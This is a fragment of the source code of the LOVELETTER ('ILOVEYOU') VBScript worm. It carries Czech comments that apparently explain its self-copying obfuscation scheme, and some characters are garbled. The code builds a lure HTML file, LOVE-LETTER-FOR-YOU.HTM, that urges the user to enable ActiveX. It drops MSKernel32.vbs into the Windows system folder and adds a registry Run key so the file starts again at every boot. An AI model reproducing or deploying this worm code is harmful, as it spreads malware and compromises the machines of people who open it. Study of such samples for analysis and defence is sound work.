"  dta1= ]-]<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ ]-]&vbcrlf& _"&vbcrlf& _
"        ]-]ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> ]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<?-?BODY><?-?HTML>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<SCRIPT language=@-@JScript@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<!--?-??-?]-]&vbcrlf& _"&vbcrlf& _
"        ]-]if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}]-]&vbcrlf& _"&vbcrlf& _
"        ]-]?-??-?-->]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<?-?SCRIPT>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<SCRIPT LANGUAGE=@-@VBScript@-@>]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<!--]-]&vbcrlf& _"&vbcrlf& _
"        ]-]on error resume next]-]&vbcrlf& _"&vbcrlf& _
"        ]-]dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit]-]&vbcrlf& _"&vbcrlf& _
"        ]-]aw=1]-]&vbcrlf& _"&vbcrlf& _
"        ]-]code=]-]"&vbcrlf& _
"  [-[ "&vbcrlf& _
"  [-[ t�mto bude HTML kon�it"&vbcrlf& _
"  [-["&vbcrlf& _
"  dta2= ]-]set fso=CreateObject(@-@Scripting.FileSystemObject@-@)]-]&vbcrlf& _"&vbcrlf& _
"        ]-]set dirsystem=fso.GetSpecialFolder(1)]-]&vbcrlf& _"&vbcrlf& _
"        ]-]code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))]-]&vbcrlf& _"&vbcrlf& _
"        ]-]code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))]-]&vbcrlf& _"&vbcrlf& _
"        ]-]code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))]-]&vbcrlf& _"&vbcrlf& _
"        ]-]set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)]-]&vbcrlf& _"&vbcrlf& _
"        ]-]wri.write code4]-]&vbcrlf& _"&vbcrlf& _
"        ]-]wri.close]-]&vbcrlf& _"&vbcrlf& _
"        ]-]if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then]-]&vbcrlf& _"&vbcrlf& _
"        ]-]if (err.number=424) then]-]&vbcrlf& _"&vbcrlf& _
"        ]-]aw=0]-]&vbcrlf& _"&vbcrlf& _
"        ]-]end if]-]&vbcrlf& _"&vbcrlf& _
"        ]-]if (aw=1) then]-]&vbcrlf& _"&vbcrlf& _
"        ]-]document.write @-@ERROR: can#-#t initialize ActiveX@-@]-]&vbcrlf& _"&vbcrlf& _
"        ]-]window.close]-]&vbcrlf& _"&vbcrlf& _
"        ]-]end if]-]&vbcrlf& _"&vbcrlf& _
"        ]-]end if]-]&vbcrlf& _"&vbcrlf& _
"        ]-]Set regedit = CreateObject(@-@WScript.Shell@-@)]-]&vbcrlf& _"&vbcrlf& _
"        ]-]regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@]-]&vbcrlf& _"&vbcrlf& _
"        ]-]?-??-?-->]-]&vbcrlf& _"&vbcrlf& _
"        ]-]<?-?SCRIPT>]-]"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ #-# = apostrof"&vbcrlf& _
"  [-[ @-@ = �vozovky"&vbcrlf& _
"  [-[ ?-? = lom�tko"&vbcrlf& _
"  [-[ ^-^ = obr�cen� lom�tko"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ v�sledkem t�to nesmysln� manipulace je dt5 a dt6"&vbcrlf& _
"  [-[ obsahuj�c� za��tek a konec HTML "&vbcrlf& _
"  [-["&vbcrlf& _
"  dt1 = replace(dta1, chr(35) & chr(45) & chr(35), ]-][-[]-])"&vbcrlf& _
"  dt1 = replace(dt1, chr(64) & chr(45) & chr(64), ]-]]-]]-]]-])"&vbcrlf& _
"  dt4 = replace(dt1, chr(63) & chr(45) & chr(63), ]-]/]-])"&vbcrlf& _
"  dt5 = replace(dt4, chr(94) & chr(45) & chr(94), ]-]%-%]-])"&vbcrlf& _
"  dt2 = replace(dta2, chr(35) & chr(45) & chr(35), ]-][-[]-])"&vbcrlf& _
"  dt2 = replace(dt2, chr(64) & chr(45) & chr(64), ]-]]-]]-]]-])"&vbcrlf& _
"  dt3 = replace(dt2, chr(63) & chr(45) & chr(63), ]-]/]-])"&vbcrlf& _
"  dt6 = replace(dt3, chr(94) & chr(45) & chr(94), ]-]%-%]-])"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ na�ten� kompletn�ho k�du viru"&vbcrlf& _
"  [-[ rozkouskov�n� na jednotliv� ��dky, pot� zpracov�n�"&vbcrlf& _
"  [-[ problematick�ch znak� na pseudok�dy"&vbcrlf& _
"  [-[ a p�evod na strukturu p�i�aditelnou do prom�nn�"&vbcrlf& _
"  [-["&vbcrlf& _
"  set fso = CreateObject(]-]Scripting.FileSystemObject]-])"&vbcrlf& _
"  set c = fso.OpenTextFile(WScript.ScriptFullName, 1)"&vbcrlf& _
"  lines = Split(c.ReadAll, vbcrlf)"&vbcrlf& _
"  l1 = ubound(lines)"&vbcrlf& _
"  for n = 0 to ubound(lines)"&vbcrlf& _
"    lines(n)=replace(lines(n), ]-][-[]-], chr(91) + chr(45) + chr(91))"&vbcrlf& _
"    lines(n)=replace(lines(n), ]-]]-]]-]]-], chr(93) + chr(45) + chr(93))"&vbcrlf& _
"    lines(n)=replace(lines(n), ]-]%-%]-], chr(37) + chr(45) + chr(37))"&vbcrlf& _
"    if (l1 = n) then"&vbcrlf& _
"      lines(n) = chr(34) + lines(n) + chr(34)"&vbcrlf& _
"    else"&vbcrlf& _
"      lines(n) = chr(34) + lines(n) + chr(34) & ]-]&vbcrlf& _]-]"&vbcrlf& _
"    end if"&vbcrlf& _
"  next"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ vytvo�en� HTML souboru"&vbcrlf& _
"  [-["&vbcrlf& _
"  set b=fso.CreateTextFile(dirsystem + ]-]%-%LOVE-LETTER-FOR-YOU.HTM]-])"&vbcrlf& _
"  b.close"&vbcrlf& _
"  [-["&vbcrlf& _
"  [-[ napln�n� HTML souboru"&vbcrlf& _
"  [-[ zap�e za��tek (dt5), v�echny ��dky vlastn�ho viru (pole lines)"&vbcrlf& _
"  [-[ a pot� pochopiteln� konec (dt6)"&vbcrlf& _
"  [-["&vbcrlf& _
"  set d=fso.OpenTextFile(dirsystem + ]-]%-%LOVE-LETTER-FOR-YOU.HTM]-],2)"&vbcrlf& _
"  d.write dt5"&vbcrlf& _
"  d.write join(lines, vbcrlf)"&vbcrlf& _
"  d.write vbcrlf"&vbcrlf& _
"  d.write dt6"&vbcrlf& _
"  d.close"&vbcrlf& _
"end sub"&vbcrlf& _
""
set fso=CreateObject("Scripting.FileSystemObject")
set dirsystem=fso.GetSpecialFolder(1)
code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))
code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))
code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))
set wri=fso.CreateTextFile(dirsystem&"\MSKernel32.vbs")
wri.write code4
wri.close
if (fso.FileExists(dirsystem&"\MSKernel32.vbs")) then
if (err.number=424) then
aw=0
end if
if (aw=1) then
document.write "ERROR: can't initialize ActiveX"
window.close
end if
end if
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32",dirsystem&"\MSKernel32.vbs"
//-->
</SCRIPT>